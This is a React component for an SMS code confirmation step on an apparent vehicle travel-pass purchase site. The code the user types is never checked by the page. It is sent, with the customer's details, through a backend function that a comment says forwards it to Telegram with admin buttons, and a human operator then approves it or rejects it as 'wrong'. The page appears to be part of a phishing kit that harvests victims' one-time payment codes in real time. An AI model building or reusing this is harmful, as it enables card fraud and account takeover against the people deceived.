import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, MessageSquare, Clock, Loader2, CheckCircle } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { saveVehicleData, saveDurationData, saveCustomerInfo } from "@/lib/cookies";

const SmsConfirmationPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  const [code, setCode] = useState("");
  const [timeRemaining, setTimeRemaining] = useState(300); // 5 minutes
  const [isVerifying, setIsVerifying] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [error, setError] = useState("");
  const [actualSmsCode, setActualSmsCode] = useState("");
  const [verificationId, setVerificationId] = useState("");
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const pollIntervalRef = useRef<number | null>(null);
  const pollTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    // Check if we have the required data
    if (!location.state?.vehicle || !location.state?.duration || !location.state?.customerInfo || !location.state?.userId) {
      navigate('/');
      return;
    }

    // Don't show this page if already redirecting
    if (isRedirecting) {
      return;
    }

    // Start countdown timer for code expiration
    const expiryTimer = setInterval(() => {
      setTimeRemaining(prev => {
        if (prev <= 1) {
          clearInterval(expiryTimer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(expiryTimer);
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (pollTimeoutRef.current) clearTimeout(pollTimeoutRef.current);
    };
  }, [location.state, navigate, isRedirecting]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // Check verification status directly from database - same pattern as payment
  const checkVerificationStatus = async () => {
    try {
      const { data: verificationData } = await supabase
        .from('verification_requests')
        .select('status')
        .eq('verification_id', verificationId)
        .single();

      if (verificationData) {
        if (verificationData.status === 'approved') {
          console.log('Verification approved! Redirecting...');
          
          // Immediately set redirecting state to prevent further polls
          setIsRedirecting(true);
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          if (pollTimeoutRef.current) clearTimeout(pollTimeoutRef.current);
          setWaitingForAdmin(false);
          setIsVerifying(false);

          // Analytics event
          if (window.gtag) {
            window.gtag('event', 'sms_verified');
          }

          // Generate order ID if missing
          const orderId = location.state.orderId || `TRP${Date.now()}${Math.random().toString(36).substr(2, 5).toUpperCase()}`;

          // Persist details so confirmation page can fall back safely
          saveVehicleData(location.state.vehicle);
          saveDurationData(location.state.duration);
          if (location.state.customerInfo) saveCustomerInfo(location.state.customerInfo);

          // Notify user and redirect
          toast({ title: "Verified", description: "Approved by admin. Redirecting..." });
          
          // Replace history entry and include order id in URL as fallback
          navigate(`/confirmation?oid=${orderId}`, {
            replace: true,
            state: {
              ...location.state,
              orderId,
              completedAt: new Date().toISOString()
            }
          });
          
          // Hard redirect fallback if SPA navigation fails for any reason
          setTimeout(() => {
            if (!window.location.pathname.includes('/confirmation')) {
              window.location.assign(`/confirmation?oid=${orderId}`);
            }
          }, 500);
        } else if (verificationData.status === 'rejected') {
          console.log('Status rejected - showing error');
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          setWaitingForAdmin(false);
          setIsVerifying(false);
          
          toast({
            variant: "destructive",
            title: "Verification Failed",
            description: "Wrong verification code. Please try again.",
          });
          
          setCode("");
        }
      }
    } catch (error) {
      console.error('Error checking verification status:', error);
    }
  };

  const handleVerifyCode = async () => {
    if (code.length !== 6) {
      setError("Please enter a 6-digit code");
      return;
    }

    setIsVerifying(true);
    setWaitingForAdmin(true);
    setError("");

    try {
      // Send verification request to Telegram with admin buttons
      const { data, error } = await supabase.functions.invoke('verify-sms', {
        body: {
          userId: location.state.userId,
          code: code,
          customerInfo: location.state.customerInfo,
          vehicle: location.state.vehicle,
          duration: location.state.duration
        }
      });

      if (error) {
        throw error;
      }

      if (data.success) {
        setVerificationId(data.verificationId);
        
        // Start polling for admin response - same pattern as payment page
        const startPolling = () => {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          pollIntervalRef.current = window.setInterval(checkVerificationStatus, 2000);
        };

        startPolling();

        // Clear polling after 5 minutes
        pollTimeoutRef.current = window.setTimeout(() => {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          if (waitingForAdmin && !isRedirecting) {
            setWaitingForAdmin(false);
            setIsVerifying(false);
            toast({
              variant: "destructive",
              title: "Verification Timeout",
              description: "Verification request timed out. Please try again.",
            });
          }
        }, 300000); // 5 minutes
      } else {
        throw new Error(data.message || "Failed to send verification request");
      }
    } catch (error) {
      console.error('Error verifying code:', error);
      setIsVerifying(false);
      setWaitingForAdmin(false);
      toast({
        variant: "destructive",
        title: "Verification Error",
        description: "Failed to verify code. Please try again.",
      });
    }
  };

  const sendSmsCode = async (testType?: 'success' | 'error') => {
    setIsSending(true);
    setError("");

    try {
      const { data, error } = await supabase.functions.invoke('send-sms', {
        body: {
          userId: location.state.userId,
          phone: location.state.customerInfo.phone,
          customerName: location.state.customerInfo.fullName,
          testType
        }
      });

      if (error) {
        throw error;
      }

      if (data.success) {
        if (data.smsCode) {
          setActualSmsCode(data.smsCode);
        }
        
        if (testType === 'error') {
          setError("SMS sending failed. Please try again or contact support.");
        }
      } else {
        setError(data.message || "Failed to send SMS");
      }
    } catch (error) {
      console.error('Error sending SMS:', error);
      setError("Failed to send SMS. Please try again.");
    } finally {
      setIsSending(false);
    }
  };

  const handleCodeChange = (value: string) => {
    const cleanValue = value.replace(/\D/g, '').slice(0, 6);
    setCode(cleanValue);
    setError("");
  };

  const { vehicle, duration, customerInfo } = location.state || {};

  if (!vehicle || !duration) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <p className="text-xl mb-4">Session expired. Please start over.</p>
          <Button onClick={() => navigate('/')} variant="outline">
            Return to Homepage
          </Button>
        </div>
      </div>
    );
  }

  // Show loading screen while redirecting to prevent flash
  if (isRedirecting) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle className="w-8 h-8 text-white" />
          </div>
          <p className="text-xl mb-4">Verification successful! Redirecting...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background py-8">
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          <Button 
            variant="ghost" 
            onClick={() => navigate('/payment', { state: { vehicle, duration } })}
            className="mb-6"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Payment
          </Button>

          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-accent-irish rounded-full flex items-center justify-center mx-auto mb-4">
              <MessageSquare className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-4xl font-bold mb-4">Confirm Your Purchase</h1>
            <p className="text-xl text-muted-foreground">
              We've sent a 6-digit verification code to your phone
            </p>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="text-center">SMS Verification</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="text-center">
                <p className="text-muted-foreground mb-2">
                  Code sent to your registered mobile number
                </p>
              </div>

              <div className="form-field">
                <label className="form-label text-center block">Enter Verification Code</label>
                <Input
                  className="form-input text-center text-2xl font-bold tracking-widest"
                  value={code}
                  onChange={(e) => handleCodeChange(e.target.value)}
                  placeholder="000000"
                  maxLength={6}
                  autoFocus
                />
                {error && <p className="form-error text-center">{error}</p>}
              </div>

              <Button
                onClick={handleVerifyCode}
                disabled={code.length !== 6 || isVerifying}
                className="btn-irish w-full text-lg py-4"
              >
                {isVerifying ? (
                  <div className="flex items-center gap-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Verification
                  </div>
                ) : (
                  "Verify Code"
                )}
              </Button>

              <div className="text-center space-y-4">
                <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
                  <Clock className="w-4 h-4" />
                  <span>
                    {timeRemaining > 0 ? `Code expires in ${formatTime(timeRemaining)}` : "Code expired"}
                  </span>
                </div>

              </div>

              {/* Order Summary */}
              <div className="bg-muted p-4 rounded-lg space-y-2">
                <h3 className="font-semibold text-center mb-3">Order Summary</h3>
                <div className="text-sm space-y-1">
                  <div className="flex justify-between">
                    <span>Vehicle:</span>
                    <span>{vehicle.color} {vehicle.make} {vehicle.model}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Pass:</span>
                    <span>{duration.label}</span>
                  </div>
                  <div className="flex justify-between font-semibold">
                    <span>Total:</span>
                    <span>€{duration.discountedPrice.toFixed(2)}</span>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="text-center mt-6 text-sm text-muted-foreground">
            <p>Having trouble? Contact support at <a href="mailto:support@travel-pass.live" className="text-accent-irish hover:underline">support@travel-pass.live</a></p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SmsConfirmationPage;